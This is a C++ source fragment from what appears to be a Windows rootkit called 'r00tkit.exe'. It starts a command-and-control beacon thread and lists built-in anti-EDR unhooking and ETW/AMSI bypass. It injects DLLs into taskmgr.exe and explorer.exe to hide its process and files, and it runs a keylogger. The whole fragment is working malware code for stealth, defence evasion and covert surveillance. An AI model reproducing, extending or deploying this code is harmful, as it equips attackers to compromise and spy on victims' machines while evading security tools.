        HANDLE hC2Thread = CreateThread(NULL, 0, c2ModeThread, (LPVOID)c2, 0, NULL);
        if (hC2Thread)
        {
#ifdef _DEBUG
            wcout << L"[+] C2 thread started" << endl;
#ifdef _DEBUG
            wcout << L"[+] Beacon interval: " << c2->getBeaconInterval() / 1000 << L"s" << endl;
#endif
#endif
        }
    }
    else
    {
#ifdef _DEBUG
        wcout << L"[!] C2 unavailable - running in standalone mode" << endl;
#ifdef _DEBUG
        wcout << L"[i] Rootkit features available without C2:" << endl;
#endif
#ifdef _DEBUG
        wcout << L"    - NTDLL unhooking (active - anti-EDR)" << endl;
#endif
#ifdef _DEBUG
        wcout << L"    - ETW/AMSI bypass (active - anti-telemetry)" << endl;
#endif
#ifdef _DEBUG
        wcout << L"    - Process hiding (processHooks.dll)" << endl;
#endif
#ifdef _DEBUG
        wcout << L"    - File hiding (fileHooks.dll)" << endl;
#endif
#ifdef _DEBUG
        wcout << L"    - Registry hiding (registryHooks.dll)" << endl;
#endif
#endif
    }

#ifdef _DEBUG
    wcout << L"\n[+] Rootkit active!" << endl;
#ifdef _DEBUG
    wcout << L"[i] Daemon mode - Running in background" << endl;
#endif
#ifdef _DEBUG
    wcout << L"[*] Activating stealth mode..." << endl;
#endif
#endif

    // Hide rootkit process from Task Manager
    wstring myProcess = L"r00tkit.exe";
    vector<wstring> agentVector;
    try
    {
        agentVector = deserializeWStringVector(L"agentMapped");
    }
    catch (...)
    {
        agentVector.clear();
    }
    agentVector.push_back(myProcess);
    Serialitzator::serializeVectorWString(agentVector, L"agentMapped");

    DWORD taskmgrPID = getPIDbyProcName("taskmgr.exe");
    if (taskmgrPID != 0 && !isDLLLoaded(taskmgrPID, L"processHooks.dll"))
    {
        wchar_t myDllPath[MAX_PATH];
        GetModuleFileNameW(NULL, myDllPath, MAX_PATH);
        wstring pathW(myDllPath);
        size_t pos = pathW.find_last_of(L"\\");
        if (pos != wstring::npos)
        {
            pathW = pathW.substr(0, pos) + L"\\processHooks.dll";
            if (injectDLL(pathW.c_str(), taskmgrPID))
            {
#ifdef _DEBUG
                wcout << L"[+] Injected processHooks.dll into taskmgr.exe (PID " << taskmgrPID << L")" << endl;
#endif
            }
        }
    }

    // Hide rootkit files from Explorer
    vector<wstring> pathVector;
    try
    {
        pathVector = deserializeWStringVector(L"pathMapped");
    }
    catch (...)
    {
        pathVector.clear();
    }

    wstring rootkitDir = exeDirW;
    pathVector.push_back(rootkitDir + L"r00tkit.exe");
    pathVector.push_back(rootkitDir + L"processHooks.dll");
    pathVector.push_back(rootkitDir + L"fileHooks.dll");
    pathVector.push_back(rootkitDir + L"registryHooks.dll");
    Serialitzator::serializeVectorWString(pathVector, L"pathMapped");

    DWORD explorerPID = getPIDbyProcName("explorer.exe");
    if (explorerPID != 0 && !isDLLLoaded(explorerPID, L"fileHooks.dll"))
    {
        wstring fileDllPath = rootkitDir + L"fileHooks.dll";
        if (injectDLL(fileDllPath.c_str(), explorerPID))
        {
#ifdef _DEBUG
            wcout << L"[+] Injected fileHooks.dll into explorer.exe (PID " << explorerPID << L")" << endl;
#endif
        }
    }

#ifdef _DEBUG
    wcout << L"[OK] Stealth mode active (process + files hidden)" << endl;
#endif

    while (c2Available && c2 && c2->isRunning())
    {
        JitterSleep(1000);
    }

    Keylogger::Stop();
    return 0;
}